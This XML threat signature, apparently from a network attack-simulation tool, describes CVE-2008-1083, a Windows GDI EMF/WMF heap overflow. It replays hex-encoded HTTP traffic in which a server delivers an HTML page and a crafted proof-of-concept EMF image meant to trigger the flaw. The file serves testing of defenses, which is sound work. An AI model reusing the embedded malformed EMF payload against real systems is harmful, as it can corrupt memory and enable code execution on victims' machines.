<?xml version="1.0" encoding="utf-8"?>
<threatSignature>
  <ThreatProperties>
    <ExecDesc display="true" value="Microsoft Windows GDI Metafile Image Handling Heap Overflow (IPv6 Version)"/>
    <EngDesc display="true" value="There exists a heap buffer overflow vulnerability in Microsoft Graphics Device Interface (GDI) library. The flaw is due to a calculation error while handling EMF or WMF image files. A remote attacker can exploit this vulnerability by enticing the target user to open a crafted EMF or WMF image file, potentially causing arbitrary code to be injected and executed in the security context of the current user. (IPv6 Version)"/>
    <Intent display="true">
      <item value="BUFFER_OVERFLOW"/>
    </Intent>
    <Protocol display="true" value="HTTP/IPv6"/>
    <Type_Of_Equipment display="true">
      <item value="Application"/>
    </Type_Of_Equipment>
    <Known_Vendors_Affected display="true">
      <item value="Microsoft"/>
    </Known_Vendors_Affected>
    <Known_Products_Affected display="true">
      <item value="Microsoft_Microsoft_Windows"/>
      <item value="Microsoft_Microsoft_Windows_Server"/>
    </Known_Products_Affected>
    <Known_Versions_Affected display="true">
      <item value="Microsoft_Windows_2000"/>
      <item value="Microsoft_Windows_XP"/>
      <item value="Microsoft_Windows_Vista"/>
    </Known_Versions_Affected>
    <Credit display="true" value="FSC20080408-12"/>
    <CVEID display="true" value="CVE-2008-1083"/>
    <bugtraqID display="true" value="28571"/>
    <OSVDB display="true" value=""/>
    <Author display="true" value="Mike Davis"/>
    <ID display="true" value="b225d934abb94b4c70a05a27c3cf9c8d"/>
    <Revision display="true" value="1"/>
    <Safe display="true" value="true"/>
    <ServerSideAttack display="true" value=""/>
    <SoftwareRevision display="true" value="2.0"/>
    <Suite display="true" value="Standard"/>
    <RunOnce display="false" value="false"/>
    <Valid_Traffic display="false" value="True"/>
    <AccessVector display="false" value="remote"/>
    <AccessComplexity display="false" value="Medium"/>
    <Authentication display="false" value="not-required"/>
    <ConfImpact display="false" value="Partial"/>
    <IntegImpact display="false" value="Partial"/>
    <AvailImpact display="false" value="Partial"/>
    <ImpactBias display="false" value="normal"/>
    <FirstAdded display="false" value="normal"/>
    <LastModified display="false" value="1225900858"/>
    <SigStyle display="false" value=""/>
    <targetNode display="false" value="B"/>
    <SigProtocol display="false" value=""/>
    <Rate display="false" value="1"/>
    <Regex display="false" value=""/>
    <Created value="1211380676" display="true"/>
  </ThreatProperties>
  <Variables>
    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="N"/>
    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="O"/>
    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="P"/>
    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="Q"/>
    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="R"/>
  </Variables>
  <Loops>
    <for index="D">
      <for index="N"/>
      <for index="O"/>
      <for index="P"/>
      <for index="Q"/>
      <for index="R"/>
    </for>
    <for index="F"/>
    <for index="G">
      <for index="N"/>
      <for index="O"/>
      <for index="P"/>
      <for index="Q"/>
      <for index="R"/>
    </for>
    <for index="H"/>
  </Loops>
  <PostScript/>
  <Output index="D" Count="">
    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="2474863B" AckNumber="CD2849B3" HeaderLength="05" WindowSize="FAF0" Checksum="F357" UrgentPointer="0000" Options="" Payload="474554202F7E6873616679616C6C61682F706F632E68746D6C20485454502F312E310D0A4163636570743A20696D6167652F6769662C20696D6167652F782D786269746D61702C20696D6167652F6A7065672C20696D6167652F706A7065672C206170706C69636174696F6E2F782D73686F636B776176652D666C6173682C206170706C69636174696F6E2F766E642E6D732D657863656C2C206170706C69636174696F6E2F766E642E6D732D706F776572706F696E742C206170706C69636174696F6E2F6D73776F72642C202A2F2A0D0A4163636570742D4C616E67756167653A20656E2D75730D0A4163636570742D456E636F64696E673A20677A69702C206465666C6174650D0A49662D4D6F6469666965642D53696E63653A205765642C2030392041707220323030382031343A33363A343120474D540D0A49662D4E6F6E652D4D617463683A20223864303063342D38662D6131313335303430220D0A557365722D4167656E743A204D6F7A696C6C612F342E302028636F6D70617469626C653B204D53494520362E303B2057696E646F7773204E5420352E313B20535631290D0A486F73743A20737469636B790D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
      </IPv6>
    </Ethernet>
  </Output>
  <Output index="G" Count="">
    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="24748809" AckNumber="CD284BB7" HeaderLength="05" WindowSize="F8EC" Checksum="79D0" UrgentPointer="0000" Options="" Payload="474554202F7E6873616679616C6C61682F706F632E656D6620485454502F312E310D0A4163636570743A202A2F2A0D0A526566657265723A20687474703A2F2F737469636B792F7E6873616679616C6C61682F706F632E68746D6C0D0A4163636570742D4C616E67756167653A20656E2D75730D0A4163636570742D456E636F64696E673A20677A69702C206465666C6174650D0A49662D4D6F6469666965642D53696E63653A205765642C2030392041707220323030382031343A33313A303120474D540D0A49662D4E6F6E652D4D617463683A20223631343765652D3936382D3863636635333430220D0A557365722D4167656E743A204D6F7A696C6C612F342E302028636F6D70617469626C653B204D53494520362E303B2057696E646F7773204E5420352E313B20535631290D0A486F73743A20737469636B790D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
      </IPv6>
    </Ethernet>
  </Output>
  <Input>
    <Ethernet/>
  </Input>
  <ServerSide display="1,3">
    <Output index="F" Count="">
      <Ethernet srcMac="" destMac="" pktType="0800">
        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
          <TCP srcPort="" destPort="" SeqNumber="CD2849B3" AckNumber="24748809" HeaderLength="05" WindowSize="1920" Checksum="B6EF" UrgentPointer="0000" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A205765642C2030392041707220323030382031343A33393A333020474D540D0A5365727665723A204170616368652F322E302E3532202843656E744F5329205048502F342E332E39206D6F645F707974686F6E2F332E312E3320507974686F6E2F322E332E34206D6F645F7065726C2F322E302E31205065726C2F76352E382E350D0A4C6173742D4D6F6469666965643A205765642C2030392041707220323030382031343A33383A353720474D540D0A455461673A20223864303064352D38652D6139326538323430220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A203134320D0A4B6565702D416C6976653A2074696D656F75743D31352C206D61783D3130300D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A20746578742F68746D6C3B20636861727365743D49534F2D383835392D310D0A0D0A3C68746D6C3E0A3C626F64793E0A436F70797269676874204173737572656E742053656375726520546563686E6F6C6F676965732C20612054656C757320436F6D70616E793C62723E0A416C6C20526967687473205265736572766564203C62723E0A3C696D67207372633D22706F632E656D66223E0A3C2F626F64793E0A3C2F68746D6C3E0A3C68746D6C3E0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
        </IPv6>
      </Ethernet>
    </Output>
    <Output index="H" Count="">
      <Ethernet srcMac="" destMac="" pktType="0800">
        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
          <TCP srcPort="" destPort="" SeqNumber="CD284BB7" AckNumber="24748963" HeaderLength="05" WindowSize="1D50" Checksum="3900" UrgentPointer="0000" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A205765642C2030392041707220323030382031343A33393A333020474D540D0A5365727665723A204170616368652F322E302E3532202843656E744F5329205048502F342E332E39206D6F645F707974686F6E2F332E312E3320507974686F6E2F322E332E34206D6F645F7065726C2F322E302E31205065726C2F76352E382E350D0A4C6173742D4D6F6469666965643A205765642C2030392041707220323030382031343A33393A303420474D540D0A455461673A20223631343765652D3936382D6139393935323030220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A20323430380D0A4B6565702D416C6976653A2074696D656F75743D31352C206D61783D39390D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A20766964656F2F756E6B6E6F776E0D0A0D0A01000000580000000000000000000000200000002000000000000000000000004C0300004C03000020454D4600000100640900000B0000000A0000000000000000000000000000002003000020030000D3000000D30000000A00000010000000000000000000000009000000100000002000000020000000130000000C00000001000000120000000C00000002000000190000000C000000FFFFFF02160000000C00000018000000260000001C0000000100000000000000000000000000000000000002250000000C0000000100000051000000800800000000000020000000200000000000000000000000000000000000000000000000200000002000000050000000440400007804000000040000020000002000CC0020000000200000000C00000014000000000008002800000020000000200000000100080000000000000400000000000000000000000000000000000000000000808080000000800000808000008000008080000080000000800080004080800040400000FF80000080400000FF00400000408000FFFFFF00C0C0C0000000FF0000FFFF0000FF0000FFFF0000FF000000FF00FF0080FFFF0080FF0000FFFF8000FF8080008000FF004080FF00C0DCC000F0CAA600040404000F040400040E0400190E0400240E0400042304000F0E0F0024190F00040E1A0019191A0024231A002E231A000F381A00AD621A00392E24004E382400AD6C2400B76C2400392E2F0043382F004E422F0058422F00AD6C2F00B7772F00A26C3A00B7773A00C2773A004E4244004E4D4400584D440063574400B7774400B7814400C28144002898400004234F0004384F0058574F006D624F0083624F008D6C4F00A2814F00B7814F00C2814F00B78B4F00C28B4F00217B390039A04F0043A04F0039AB4F0063625A00786C5A00836C5A0098775A0098815A00C2815A00C28B5A0039A05A0043AB5A004EAB5A00636264006D6C6400836C64008D7764008D81640098816400A28B6400AD8B6400C28B6400B7966400C29664004EA06400CCA064004EAB6400E1AB640058B5640078776F0083776F008D816F00A28B6F00A2966F00B7966F00CC966F00B7A06F00C2A06F0058AB6F0063AB6F00D7AB6F0058B56F0063B56F00D7B56F00E1B56F0083817A00AD967A00CC967A00C2A07A00D7AB7A00E1AB7A0058B57A0063B57A006DB57A00D7B57A00E1B57A008D8B8400988B8400A2968400B7A08400C2A08400D7AB8400E1AB8400D7B58400E1B584006DBF840078BF8400E1BF84008D8B8F00988B8F0098968F00A2968F00B7A08F00CCA08F00C2AB8F00CCAB8F00E1AB8F00D7B58F00E1B58F0078BF8F0083BF8F00244D9A0098969A00A2969A0098A09A00A2A09A00ADA09A00B7A09A00CCAB9A00D7B59A00D7BF9A00E1BF9A00ECBF9A00A2A0A400ADABA400C2B5A400CCB5A400D7BFA400E1BFA4008DCAA40098CAA400E1CAA400ECCAA400ECD4A4004E6CAF00ADABAF00B7B5AF00C2BFAF0098CAAF00E1CAAF00ECCAAF0098D4AF00E1D4AF00ECD4AF002E57BA005877BA00C2BFBA00C2CABA00ECCABA00E1D4BA00ECD4BA002457C4002462C4003962C400396CC4004E77C4006381C4006D8BC40019ABC400C2BFC400CCCAC400D7D4C400E1D4C400ECD4C4002457CF002462CF002E62CF002E6CCF004377CF005881CF007896CF00D7CACF00CCD4CF00D7D4CF00E1DFCF00ECDFCF00F7DFCF00ECE9CF001957DA002462DA002E62DA00246CDA002E6CDA00396CDA003977DA00A2B5DA00D7D4DA00E1DFDA00E1E9DA00F7E9DA002E77E4003977E4004381E4004E81E400438BE400E1DFE400ECE9E400F7E9E400ECF4E4004381EF005294FF0004BFEF0043D4EF00ECE9EF00F7F4EF0004BFFA0019BFFA000FCAFA0024CAFA000E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E00010E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E010000000E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E010000000400010E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0100000004040400000E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0100000004040404040400010E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E01000000040404040404040400000E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E01000000040404040404040404040400010E0E0E0E0E0E0E0E0E0E0E0E0E010000001100040404040404040404040400000E0E0E0E0E0E0E0E0E0E0E010000001111110004040404040400000004040400010E0E0E0E0E0E0E0E0100000011111111111100040404040014141400040400000E0E0E0E0E0E0000000011111111110000000104040400141414140004040400010E0E0E0E0E0100111111111111000404040404040400141414140004000000000E0E0E0E0E0E0000111111111100040404040404040014141414060014141400010E0E0E0E0E0100111111111100040404040100040400001414141414141400000E0E0E0E0E0E0000111111111100040404001100040400141414141414141400010E0E0E0E0E0100111111111111000000111100000014141414141414141400000E0E0E0E0E0E0000111111111111111111000000141400000014141414141400010E0E0E0E0E0100111111111111111100101000140010101000141414141400000E0E0E0E0E0E0000111111111111110100101000001010101000141414141400010E0E0E0E0E0100111111000111111111001010101010101000141414141400000E0E0E0E0E0E0000000010001111111100101010101010100014141414141400010E0E0E0E0E0100101010001111111100101010020000001414141414000000000E0E0E0E0E0E0000101000111111001010101000141414141414000000010E0E0E0E0E0E0E0E010010101000000010101010101000141414000000010E0E0E0E0E0E0E0E0E0E0E000010101010101010101010100014000000010E0E0E0E0E0E0E0E0E0E0E0E0E01001010101010101010101010000000010E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E00001010101010101010000000010E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0100101010101010000000010E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0000101010000000010E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E010010000000010E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E000000010E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E00010E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E0E00000014000000000000000000000000000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
        </IPv6>
      </Ethernet>
    </Output>
  </ServerSide>
</threatSignature>
